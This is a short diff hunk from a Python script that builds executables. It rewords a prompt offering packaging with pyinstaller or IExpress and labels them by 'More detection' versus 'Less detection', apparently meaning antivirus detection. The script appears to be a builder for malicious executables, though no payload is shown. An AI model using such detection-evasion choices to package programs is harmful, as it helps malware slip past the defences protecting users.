@@ -228,7 +228,7 @@ while True:
     while True:
         if Exe in ['y', 'yes']:
             
-            ask = input('Do you want to make it exe with pyinstaller or with IExpress? (Yes if pyinstaller) (No if IExpress)')
+            ask = input('Do you want to make it exe with pyinstaller or with IExpress? (Yes if pyinstaller (More detection) / (No if IExpress (Less detection)')
             if ask in ["yes","y"]:
                 from sys import executable
                 icon_path = input('Enter the path to the icon file (leave blank for no icon): ')
